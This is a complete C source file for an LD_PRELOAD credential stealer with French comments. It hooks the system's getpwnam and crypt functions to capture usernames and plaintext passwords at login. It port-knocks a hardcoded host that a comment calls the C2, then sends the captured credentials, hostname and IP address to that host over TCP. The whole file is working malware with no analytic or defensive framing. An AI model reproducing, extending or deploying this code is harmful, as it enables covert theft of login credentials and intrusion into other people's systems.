#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <dlfcn.h>
#include <pwd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <errno.h>

#define REMOTE_IP "192.168.1.102"
#define REMOTE_PORT 8080
#define KNOCK_PORT1 1234
#define KNOCK_PORT2 2345
#define KNOCK_PORT3 3456

static char local_hostname[256] = "";
static char local_fqdn[256] = "";
static char local_ip[INET_ADDRSTRLEN] = "";
static __thread char last_username[256] = "";

typedef struct passwd *(*getpwnam_t)(const char *name);
typedef char *(*crypt_t)(const char *key, const char *salt);

__attribute__((constructor))
static void init_local_info(void) {
    if (gethostname(local_hostname, sizeof(local_hostname)) != 0) {
        snprintf(local_hostname, sizeof(local_hostname), "unknown-host");
    }

    struct hostent *he = gethostbyname(local_hostname);
    if (he && he->h_name) {
        snprintf(local_fqdn, sizeof(local_fqdn), "%s", he->h_name);
        if (he->h_addrtype == AF_INET && he->h_addr_list && he->h_addr_list[0]) {
            inet_ntop(AF_INET, he->h_addr_list[0], local_ip, sizeof(local_ip));
        } else {
            snprintf(local_ip, sizeof(local_ip), "unknown-ip");
        }
    } else {
        snprintf(local_fqdn, sizeof(local_fqdn), "unknown-fqdn");
        snprintf(local_ip, sizeof(local_ip), "unknown-ip");
    }
}

void send_knock(int port) {
    int sock;
    struct sockaddr_in server_addr;

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        return;
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    inet_pton(AF_INET, REMOTE_IP, &server_addr.sin_addr);

    sendto(sock, "knock", 5, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
    close(sock);
}

void perform_knocking() {
    send_knock(KNOCK_PORT1);
    sleep(1);
    send_knock(KNOCK_PORT2);
    sleep(1);
    send_knock(KNOCK_PORT3);
    sleep(2); // Laisser le C2 s'activer
}

void send_credentials_to_server(const char *username, const char *password, const char *salt) {
    perform_knocking();  // âš¡ Ajout du Port Knocking avant la connexion

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        return;
    }

    struct sockaddr_in serv_addr;
    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(REMOTE_PORT);

    if (inet_pton(AF_INET, REMOTE_IP, &serv_addr.sin_addr) <= 0) {
        close(sock);
        return;
    }

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        close(sock);
        return;
    }

    char buffer[1024];
    snprintf(buffer, sizeof(buffer),
             "LocalHost: %s\nLocalFQDN: %s\nLocalIP: %s\n"
             "Username: %s\nPassword: %s\nSalt: %s\n\n",
             local_hostname, local_fqdn, local_ip,
             username ? username : "(null)",
             password ? password : "(null)",
             salt ? salt : "(null)");

    send(sock, buffer, strlen(buffer), 0);
    close(sock);
}

struct passwd *getpwnam(const char *name) {
    static getpwnam_t orig_getpwnam = NULL;
    if (!orig_getpwnam) {
        orig_getpwnam = (getpwnam_t)dlsym(RTLD_NEXT, "getpwnam");
        if (!orig_getpwnam) {
            fprintf(stderr, "dlsym(getpwnam) failed: %s\n", dlerror());
            _exit(1);
        }
    }

    if (name && name[0] != '\0') {
        snprintf(last_username, sizeof(last_username), "%s", name);
    }

    return orig_getpwnam(name);
}

char *crypt(const char *key, const char *salt) {
    static crypt_t orig_crypt = NULL;
    if (!orig_crypt) {
        orig_crypt = (crypt_t)dlsym(RTLD_NEXT, "crypt");
        if (!orig_crypt) {
            fprintf(stderr, "dlsym(crypt) failed: %s\n", dlerror());
            _exit(1);
        }
    }

    if (key && key[0] != '\0') {
        send_credentials_to_server(last_username, key, salt);
    }

    return orig_crypt(key, salt);
}
